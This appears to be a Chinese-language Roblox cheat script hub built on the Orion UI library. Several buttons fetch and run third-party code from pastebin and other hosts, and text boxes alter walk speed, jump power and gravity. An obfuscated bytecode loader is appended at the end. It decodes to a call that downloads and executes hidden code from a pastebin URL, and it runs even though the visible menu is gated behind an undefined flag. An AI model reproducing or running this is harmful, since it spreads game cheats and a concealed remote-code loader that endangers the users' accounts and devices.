function back()
local LBLG = Instance.new("ScreenGui", getParent)
local LBL = Instance.new("TextLabel", getParent)

LBLG.Name = "LBLG"
LBLG.Parent = game.CoreGui
LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LBLG.Enabled = true
LBL.Name = "LBL"
LBL.Parent = LBLG
LBL.BackgroundColor3 = Color3.new(1, 1, 1)
LBL.BackgroundTransparency = 1
LBL.BorderColor3 = Color3.new(0, 0, 0)
LBL.Position = UDim2.new(0.15,0,0.010,0)
LBL.Size = UDim2.new(0, 133, 0, 30)
LBL.Font = Enum.Font.GothamSemibold
LBL.Text = "TextLabel"
LBL.TextColor3 = Color3.new(1, 1, 1)
LBL.TextScaled = true
LBL.TextSize = 14
LBL.TextWrapped = true
LBL.Visible = true

local FpsLabel = LBL
local Heartbeat = game:GetService("RunService").Heartbeat
local LastIteration, Start
local FrameUpdateTable = { }

local function HeartbeatUpdate()
	LastIteration = tick()
	for Index = #FrameUpdateTable, 1, -1 do
		FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
	end
	FrameUpdateTable[1] = LastIteration
	local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
	CurrentFPS = CurrentFPS - CurrentFPS % 1
	FpsLabel.Text = ("北京时间:"..os.date("%H").."时"..os.date("%M").."分")
end
Start = tick()
Heartbeat:Connect(HeartbeatUpdate)

TL = Instance.new("TextLabel", Instance.new("ScreenGui", game.CoreGui))
TL.BackgroundTransparency = 1
TL.Size = UDim2.new(0, 100, 0, 50)
TL.Visible = false
TL.TextWrapped = true

local OrionLib = loadstring(game:HttpGet("https://pastebin.com/raw/f2vR5dJd"))()

OrionLib:MakeNotification({
  Name = "欢迎你使用老大工具箱脚本启动成功",
  Content = "老大辅助工具箱-启动成功--祝你使用愉快",
  Image = "rbxassetid://15361603644",
  Time = 20
})
wait(3)
local Window = OrionLib:MakeWindow({Name = "河流工作室(河流工具箱脚本)(进化版)", HidePremium = false, SaveConfig = false, IntroText = "正在启动(河流工具箱脚本)(进化版)", ConfigFolder = "河流工具箱脚本"})

local vucnb = Window:MakeTab({
    Name = "老大工具箱公告",
    Icon = "rbxassetid://15361603644",
    PremiumOnly = false
})

vucnb:AddParagraph("工具箱还在设计-请耐心等待","")
vucnb:AddParagraph("工具箱里面的这些功能是原神帮我弄的","")
vucnb:AddParagraph("暂时工具箱也是在慢慢的更新以后会增加更多的功能","")

local fuch = Window:MakeTab({
    Name = "老大工具箱其他",
    Icon = "rbxassetid://15361603644",
    PremiumOnly = false
})

fuch:AddButton({
	Name = "获得当前位置的坐标",
	Callback = function()
	    OrionLib:MakeNotification({
	        Name = "正在获取--(获取成功)",
            Content = "成功获得当前坐标--已复制到剪贴板",
            Image = "rbxassetid://15361603644",
            Time = 8
        })
      	setclipboard("CFrame.new("..tostring(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position)..")")
  	end
})

fuch:AddButton({
	Name = "Dex Explorer",
	Callback = function()
	    OrionLib:MakeNotification({
	        Name = "正在启动(Dex Explorer)",
            Content = "正 在 加 载 Dex - Explorer (启动中耐心等待)",
            Image = "rbxassetid://15361603644",
            Time = 8
        })
      	loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
  	end
})

fuch:AddButton({
	Name = "Simple Spy",
	Callback = function()
	    OrionLib:MakeNotification({
	        Name = "正在启动(Simple Spy)",
            Content = "正 在 加 载 Simple - Spy (启动中耐心等待)",
            Image = "rbxassetid://15361603644",
            Time = 8
        })
      	loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/RS/main/SimpleSpyMobile"))()
  	end
})

fuch:AddButton({
	Name = "查看当前服务器日志",
	Callback = function()
	    OrionLib:MakeNotification({
	        Name = "正在启动(服务器日志)",
            Content = "正 在 加 载 日 志 (启动中耐心等待)",
            Image = "rbxassetid://15361603644",
            Time = 8
        })
      	game.VirtualInputManager:SendKeyEvent(true, "F9", false, game)
  	end
})

fuch:AddButton({
	Name = "获取全名",
	Callback = function()
	    Tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
        Tool.RequiresHandle = false
        Tool.Activated:Connect(function()
            setclipboard("game."..game.Players.LocalPlayer:GetMouse().Target:GetFullName())
        end)
  	end
})

local fuch = Window:MakeTab({
    Name = "老大工具箱信息",
    Icon = "rbxassetid://15361603644",
    PremiumOnly = false
})

fuch:AddDropdown({
	Name = "类型",
	Default = "FullName",
	Options = {"FullName", "FPS"},
	Callback = function(Value)
		Type = Value
	end    
})

fuch:AddToggle({
	Name = "可见",
	Default = false,
	Callback = function(Value)
		TL.Visible = Value
	end    
})

local About = Window:MakeTab({
  Name = "关于我们",
  Icon = "rbxassetid://15361603644",
  PremiumOnly = false
})
 
 About:AddButton({
	Name = "飞行-汉化版",
	Callback = function()
	    OrionLib:MakeNotification({
	        Name = "正在启动(飞行-汉化版)",
            Content = "正 在 加 载 飞 行 - 汉 化 版 (启动中耐心等待)",
            Image = "rbxassetid://15361603644",
            Time = 8
        })
      	loadstring(game:HttpGet("https://pastebin.com/raw/eUK3tbiM"))()
  	end
})
 
About:AddTextbox({
  Name = "移动速度",
  Default = "",
  TextDisappear = true,
  Callback = function(Value)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
  end
})
 
About:AddTextbox({
  Name = "跳跃高度",
  Default = "",
  TextDisappear = true,
  Callback = function(Value)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
  end
})
 
About:AddTextbox({
  Name = "重力",
  Default = "",
  TextDisappear = true,
  Callback = function(Value)
    game.Workspace.Gravity = Value
  end
})

About:AddParagraph("作者的留言","欢 迎 你 使 用 河 流 roblox 你 对 他 的 支 持 就 是 我 们 的 动 力")
 
About:AddParagraph("老大QQ官方群","493057142")
 
About:AddButton({
  Name = "老大QQ官方群(点击复制)",
  Callback = function()
      OrionLib:MakeNotification({
	        Name = "通知复制成功",
            Content = "可以在QQ里面的搜索搜索群号",
            Image = "rbxassetid://15361603644",
            Time = 8
        })
    setclipboard("587185906")
  end
})

OrionLib:Init()

game.RunService.Stepped:Connect(function()
    if Type == "FullName" and bool2 then
        TL.Text = "game."..game.Players.LocalPlayer:GetMouse().Target:GetFullName()
    end
end)

game.RunService.RenderStepped:Connect(function(step)
    if Type == "FPS" and bool2 then
        TL.Text = math.round(1/step)
    end
end)
end
local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v83=0;local v84;while true do if (v83==0) then v84=v2(v0(v30,16));if v19 then local v97=v5(v84,v19);v19=nil;return v97;else return v84;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v85=(v31/((4 -2)^(v32-(620 -(499 + 56 + 64)))))%(2^(((v33-(932 -(857 + 74))) -(v32-(569 -(367 + 201)))) + (928 -(214 + 713)))) ;return v85-(v85%(1 + 0)) ;else local v86=((1642 -(1523 + 114)) -3)^(v32-(1 + 0)) ;return (((v31%(v86 + v86))>=v86) and (2 -1)) or (0 -0) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + (2 -0) );v18=v18 + (1067 -(68 + 997)) ;return (v36 * (1526 -(226 + 1044))) + v35 ;end local function v23()local v37=0 -0 ;local v38;local v39;local v40;local v41;while true do if (v37==(118 -(32 + 85))) then return (v41 * (16441815 + 335401)) + (v40 * (14533 + 51003)) + (v39 * 256) + v38 ;end if (v37==(957 -((1637 -745) + 65))) then v38,v39,v40,v41=v1(v16,v18,v18 + ((357 -(87 + 263)) -4) );v18=v18 + (6 -2) ;v37=1;end end end local function v24()local v42=180 -(29 + 38 + 113) ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(3 + (0 -0))) then if (v47==(0 -0)) then if (v46==(0 + 0)) then return v48 * 0 ;else v47=1;v45=0 -0 ;end elseif (v47==(2999 -(802 + 150))) then return ((v46==((438 -(145 + 293)) -0)) and (v48 * ((1 -0)/(0 + 0)))) or (v48 * NaN) ;end return v8(v48,v47-(2020 -(915 + 82)) ) * (v45 + (v46/((5 -3)^(31 + 21)))) ;end if (v42==(0 -0)) then v43=v23();v44=v23();v42=(1618 -(44 + 386)) -(1069 + 118) ;end if (v42==(4 -2)) then v47=v20(v44,45 -24 ,31);v48=((v20(v44,32)==(1 + 0)) and  -(1 -(1486 -(998 + 488)))) or (1 + 0) ;v42=794 -(368 + 423) ;end if (v42==(3 -2)) then v45=19 -(10 + 8) ;v46=(v20(v44,3 -2 ,7 + 13 ) * ((444 -(416 + 26))^(102 -70))) + v43 ;v42=2;end end end local function v25(v49)local v50;if  not v49 then v49=v23();if (v49==0) then return "";end end v50=v3(v16,v18,(v18 + v49) -(1 + 0) );v18=v18 + v49 ;local v51={};for v67=773 -(201 + 571) , #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=1784 -(599 + 1185) ;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v52==(2 + 2)) then while true do if (v53==(0 + 0)) then local v95=0;while true do if (v95==(1 -0)) then v53=575 -(507 + 67) ;break;end if (v95==(1749 -(1013 + 736))) then v54=0 + 0 ;v55=nil;v95=2 -1 ;end end end if (v53==1) then local v96=0 + 0 ;while true do if (v96==(1 + 0)) then v53=7 -5 ;break;end if (v96==(867 -(550 + 317))) then v56=nil;v57=nil;v96=1 + 0 ;end end end if (v53==(2 -0)) then v58=nil;v59=nil;v53=1260 -(1043 + 214) ;end if (3~=v53) then else v60=nil;while true do local v98=0 -0 ;while true do if ((1212 -(323 + 889))==v98) then if (v54==(0 -0)) then v55={};v56={};v57={};v58={v55,v56,nil,v57};v54=1 -0 ;end if (v54~=(1992 -(582 + 1408))) then else local v101=0;local v102;while true do if (v101~=(0 + 0)) then else v102=0 -0 ;while true do local v141=0 -0 ;while true do if (0==v141) then if (v102==(3 -2)) then return v58;end if ((982 -(18 + 964))==v102) then local v152=0 -0 ;while true do if (v152==(1825 -(1195 + 629))) then v102=1 -0 ;break;end if (v152==0) then for v153=1,v23() do local v154=0 + 0 ;local v155;local v156;while true do if (v154~=(850 -(20 + 830))) then else v155=0 + 0 ;v156=nil;v154=1;end if (v154==(242 -(187 + 54))) then while true do if (v155~=(780 -(162 + 618))) then else v156=v21();if (v20(v156,739 -(542 + 196) ,1 -0 )~=(0 + 0)) then else local v160=0;local v161;local v162;local v163;local v164;local v165;while true do if (v160~=(2 + 0)) then else v165=nil;while true do if ((0 + 0)==v161) then local v166=0 -0 ;while true do if (v166==0) then v162=0 -0 ;v163=nil;v166=1 + 0 ;end if (v166==1) then v161=1552 -(1126 + 425) ;break;end end end if (v161==(1638 -(1373 + 263))) then while true do if (v162==1) then local v167=0;local v168;while true do if (v167~=(1000 -(451 + 549))) then else v168=0;while true do if (1~=v168) then else v162=7 -5 ;break;end if (v168==(1121 -(118 + 1003))) then local v176=0;while true do if (v176==0) then v165={v22(),v22(),nil,nil};if (v163==(0 -0)) then local v181=0;local v182;local v183;while true do if (v181==(0 -0)) then v182=1384 -(746 + 638) ;v183=nil;v181=1;end if (v181==(1 + 0)) then while true do if (0==v182) then v183=0 -0 ;while true do if (v183~=(0 + 0)) then else v165[980 -(553 + 424) ]=v22();v165[4]=v22();break;end end break;end end break;end end elseif (v163==1) then v165[5 -2 ]=v23();elseif (v163==2) then v165[3]=v23() -((2 + 0)^(357 -(218 + 123))) ;elseif (v163~=(3 + 0)) then else local v186=1581 -(1535 + 46) ;while true do if (v186~=(0 + 0)) then else v165[2 + 1 ]=v23() -((1 + 1)^(3 + 13)) ;v165[4]=v22();break;end end end v176=561 -(306 + 254) ;end if (v176==(1 + 0)) then v168=1;break;end end end end break;end end end if (v162==(3 -1)) then local v169=1467 -(899 + 568) ;while true do if ((0 + 0)~=v169) then else local v175=0 + 0 ;while true do if ((4 -3)~=v175) then else v169=754 -(239 + 514) ;break;end if (v175==0) then if (v20(v164,1,1 + 0 )~=(1330 -(797 + 532))) then else v165[4 -2 ]=v60[v165[1 + 1 ]];end if (v20(v164,605 -(268 + 335) ,1204 -(373 + 829) )==(291 -(60 + 230))) then v165[575 -(426 + 146) ]=v60[v165[3]];end v175=1;end end end if (v169~=1) then else v162=1 + 2 ;break;end end end if (v162~=(1456 -(282 + 1174))) then else local v170=811 -(569 + 242) ;local v171;while true do if (v170==(0 -0)) then v171=0 + 0 ;while true do if (v171~=(1 -0)) then else v162=1 -0 ;break;end if (v171~=(1024 -(706 + 318))) then else v163=v20(v156,1253 -(721 + 530) ,1274 -(945 + 326) );v164=v20(v156,9 -5 ,6 + 0 );v171=701 -(271 + 429) ;end end break;end end end if (v162==(3 + 0)) then if (v20(v164,3,3 -0 )==(1501 -(1408 + 92))) then v165[1090 -(461 + 625) ]=v60[v165[1292 -(993 + 295) ]];end v55[v153]=v165;break;end end break;end if (1==v161) then v164=nil;v165=nil;v161=218 -(42 + 174) ;end end break;end if (v160==1) then v163=nil;v164=nil;v160=2 + 0 ;end if (v160==(0 + 0)) then v161=1171 -(418 + 753) ;v162=nil;v160=1;end end end break;end end break;end end end for v157=1,v23() do v56[v157-(1 + 0) ]=v28();end v152=1 + 0 ;end end end break;end end end break;end end end v98=1 + 0 ;end if ((1 + 0)==v98) then if (v54~=1) then else v59=v23();v60={};for v104=1581 -(1183 + 397) ,v59 do local v105=0 + 0 ;local v106;local v107;local v108;while true do if (v105==(530 -(406 + 123))) then v108=nil;while true do if (v106==0) then local v149=0;local v150;while true do if (v149==0) then v150=1769 -(1749 + 20) ;while true do if ((0 + 0)==v150) then local v159=0 + 0 ;while true do if (v159~=(1975 -(1913 + 62))) then else v107=v21();v108=nil;v159=1323 -(1249 + 73) ;end if (1==v159) then v150=1;break;end end end if (v150~=(1 + 0)) then else v106=1;break;end end break;end end end if (v106==(1146 -(466 + 679))) then if (v107==(2 -1)) then v108=v21()~=(0 -0) ;elseif (v107==(7 -5)) then v108=v24();elseif (v107==(1903 -(106 + 1794))) then v108=v25();end v60[v104]=v108;break;end end break;end if (v105~=(0 + 0)) then else local v142=0 + 0 ;while true do if (v142==(0 -0)) then v106=0;v107=nil;v142=2 -1 ;end if (v142~=(1 -0)) then else v105=115 -(4 + 110) ;break;end end end end end v58[3]=v21();v54=586 -(57 + 527) ;end break;end end end break;end end break;end if ((1428 -(41 + 1386))~=v52) then else v55=nil;v56=nil;v52=2;end if (v52~=(106 -(17 + 86))) then else v59=nil;v60=nil;v52=11 -7 ;end if (v52==(304 -(244 + 60))) then v53=0 + 0 ;v54=nil;v52=477 -(41 + 435) ;end if (v52==(2 + 0)) then v57=nil;v58=nil;v52=6 -3 ;end end end local function v29(v61,v62,v63)local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...)local v69=v64;local v70=v65;local v71=v66;local v72=v27;local v73=1;local v74= -1;local v75={};local v76={...};local v77=v12("#",...) -1 ;local v78={};local v79={};for v87=0,v77 do if (v87>=v71) then v75[v87-v71 ]=v76[v87 + 1 ];else v79[v87]=v76[v87 + 1 ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do local v88=0;while true do if (v88==1) then if (v82<=6) then if (v82<=2) then if (v82<=0) then v79[v81[2]]();elseif (v82>1) then v79[v81[2]]=v63[v81[3]];else do return;end end elseif (v82<=4) then if (v82==3) then local v111=v81[2];local v112,v113=v72(v79[v111](v13(v79,v111 + 1 ,v81[3])));v74=(v113 + v111) -1 ;local v114=0;for v138=v111,v74 do v114=v114 + 1 ;v79[v138]=v112[v114];end else local v115=v81[2];local v116=v79[v81[3]];v79[v115 + 1 ]=v116;v79[v115]=v116[v81[4]];end elseif (v82==5) then do return;end else local v120=v81[2];v79[v120]=v79[v120](v13(v79,v120 + 1 ,v74));end elseif (v82<=9) then if (v82<=7) then v79[v81[2]]=v81[3];elseif (v82==8) then v79[v81[2]]=v63[v81[3]];else v79[v81[2]]();end elseif (v82<=11) then if (v82==10) then local v124=v81[2];local v125=v79[v81[3]];v79[v124 + 1 ]=v125;v79[v124]=v125[v81[4]];else local v129=0;local v130;while true do if (v129==0) then v130=v81[2];v79[v130]=v79[v130](v13(v79,v130 + 1 ,v74));break;end end end elseif (v82>12) then v79[v81[2]]=v81[3];else local v133=0;local v134;local v135;local v136;local v137;while true do if (1==v133) then v74=(v136 + v134) -1 ;v137=0;v133=2;end if (v133==2) then for v146=v134,v74 do v137=v137 + 1 ;v79[v146]=v135[v137];end break;end if (v133==0) then v134=v81[2];v135,v136=v72(v79[v134](v13(v79,v134 + 1 ,v81[3])));v133=1;end end end v73=v73 + 1 ;break;end if (v88==0) then v81=v69[v73];v82=v81[1];v88=1;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403213O00682O7470733A2O2F706173746562696E2E636F6D2F7261772F686D63745279465900083O0012023O00013O001202000100023O00200400010001000300120D000300044O000C000100034O000B5O00022O00093O000100012O00013O00017O00",v9(),...);
if start2 then
    pcall(back())
end
